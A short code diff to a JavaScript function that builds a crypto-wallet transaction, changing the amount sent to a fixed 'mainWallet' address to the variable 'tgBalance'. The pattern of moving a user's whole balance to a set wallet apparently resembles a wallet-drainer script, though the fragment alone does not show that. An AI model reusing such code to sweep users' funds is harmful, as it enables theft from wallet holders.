@@ -54,7 +54,7 @@ async function didtrans() {
         validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
         messages: [{
             address: mainWallet,
-            amount: processedBalance
+            amount: tgBalance
         }, ]
     }
     console.log(transaction);
